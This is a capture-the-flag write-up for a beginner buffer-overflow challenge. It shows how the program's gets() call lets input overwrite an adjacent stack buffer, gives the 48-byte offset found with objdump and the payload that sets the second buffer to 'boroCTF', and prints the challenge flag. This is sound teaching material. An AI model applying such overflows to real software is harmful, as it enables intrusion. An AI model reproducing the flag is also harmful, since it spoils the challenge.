# Two words, One problem

## Description

The first time pwn solves problems.

```text
nc 1xgu8bd1niap.boroctf.com 34069
```

## Solution Walkthrough

1. **Step 1**:

    First, look at the two strings provided by the challenge; they have the same buffer length.

    ```c
    char non_constant[BUFFSIZE] = "I love";
    const char constant[BUFFSIZE] = "barackCTF";
    ```

    Since the challenge uses gets(), we can directly perform an overflow.

    ```c
    void change(char *nc) {
        printf("What would like to write?\n> ");
        gets(nc);
        return;
    }
    ```

    In the if statement below, we can see that we can only get the flag if constant is boroCTF.

    ```c
    printf("%s %s!\n", nc, c);
    if (strcmp(c, "boroCTF") == 0) {
        ...
        printf("%s\n", flag);
    }
    ```

    Therefore, we can use a buffer overflow to find a way to modify constant.

2. **Step 2**:

    First, find the offset of the two strings:

    ```bash
    objdump -d -M intel ./chal | grep -A120 "<main>:"
    ```

    Result:

    ```text
    1311:	48 8d 55 a0          	lea    rdx,[rbp-0x60]
    1315:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
    ```

    The distance is:

    ```text
    0x90 - 0x60 = 0x30 = 48
    ```

    So the payload is:

    ```text
    b"A" * 48 + b"boroCTF"
    ```

3. **Step 3**:

    First, enter 2, write value, then enter the payload, and then enter 1 to read the flag.

    ```text
    2
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAboroCTF
    1
    ```

## Flag

```text
boroCTF{I_c@n_7ix_tH%s}
```
